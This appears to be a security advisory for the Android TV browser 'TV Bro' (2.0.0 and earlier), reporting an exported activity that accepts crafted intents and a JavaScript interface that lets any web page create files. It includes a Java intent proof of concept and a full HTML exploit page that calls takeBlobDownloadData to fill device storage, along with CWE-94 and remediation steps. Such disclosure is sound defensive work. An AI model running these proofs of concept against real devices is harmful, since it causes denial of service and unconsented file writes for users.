
---

## Vulnerability Report: `com.phlox.tvwebbrowser` 'TV Bro' Version <= 2.0.0

### Vulnerability: JavaScript Code Injection via Intent Handlers

---

#### **Summary**:
The `com.phlox.tvwebbrowser` application improperly handles external intents, potentially leading to Arbitrary Code Execution (ACE) via crafted URIs.

#### **Severity**:
🔴 High

#### **Details**:
The exposed `com.phlox.tvwebbrowser.activity.main.MainActivity` allows external applications to execute arbitrary JavaScript within its context. Specifically, a malicious app can invoke this activity with a specially crafted URI that contains JavaScript, leading to unwanted code execution.

##### Proof of Concept:

![poc](https://github.com/actuator/com.phlox.tvwebbrowser/assets/78701239/581c4577-3ee5-4277-8fe9-2109921a18ec)



```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setComponent(new ComponentName("com.phlox.tvwebbrowser", "com.phlox.tvwebbrowser.activity.main.MainActivity"));
intent.setData(Uri.parse("http://ampulicidae.com")); // any URL
startActivity(intent);
```

#### **Common Weakness Enumeration (CWE)**:
- [CWE-94](https://cwe.mitre.org/data/definitions/94.html): Improper Control of Generation of Code ('Code Injection')

#### **Remediation Steps**:
1. **Restrict External Intent Handling**: In `AndroidManifest.xml`, ensure the `exported` attribute for the affected activity is set to `false`.
2. **URI Sanitization**: Implement a strict validation and sanitation mechanism for URIs before processing.


#### Addendum
---

The com.phlox.tvwebbrowser application exposes a JavaScript interface, namely TVBro, to its WebView component. This interface provides powerful methods that can be invoked by any web page loaded into the WebView. Such unrestricted access can lead to a variety of security risks, such as arbitrary file downloads, resource exhaustion, and potentially other undisclosed impacts.

#### Impact:

#### Resource Exhaustion:
An attacker can generate an extremely large file using the takeBlobDownloadData method which could lead to resource exhaustion and potential denial-of-service scenarios.

#### Arbitrary File Creation: 
The method allows for the creation of files with arbitrary content on the user's device without user consent.
Potential for other Exploits: Without a detailed assessment of all methods within the TVBro interface.

#### Proof of Concept:
Below is a sample payload that exploits the vulnerability by attempting to create an extremely large file:

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TV Bro Exploit Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }

        button {
            background-color: red;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }

        #warning {
            color: red;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <h1 id="warning">WARNING: Exploit Demonstration</h1>
    <p>This page demonstrates the potential risks associated with the JavaScript interface vulnerability found in the "TV Bro" application.</p>

    <h2>Exploit Details</h2>
    <p>An attacker can generate an extremely large file which can lead to resource exhaustion and potential denial-of-service scenarios on the user's device.</p>

    <button onclick="triggerExploit()">Trigger Exploit</button>

    <div id="status"></div>

    <script>
        function generateRandomBase64String(length) {
            let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        function triggerExploit() {
            const size = 500000; // payload size
            const base64Data = generateRandomBase64String(size);
            const fileName = 'exploit.txt';
            const url = 'http://ampulicidae.com'; // any URL 
            const mimeType = 'text/plain';

            if (window.TVBro && typeof window.TVBro.takeBlobDownloadData === 'function') {
                document.getElementById('status').innerText = "About to invoke the interface...";
                window.TVBro.takeBlobDownloadData(base64Data, fileName, url, mimeType);
                document.getElementById('status').innerText = "Invoked the interface. Waiting for a response...";
            } else {
                document.getElementById('status').innerText = "Interface not found. Are you sure you're inside the vulnerable version of TV Bro?";
            }
        }
    </script>

</body>

</html>

```html
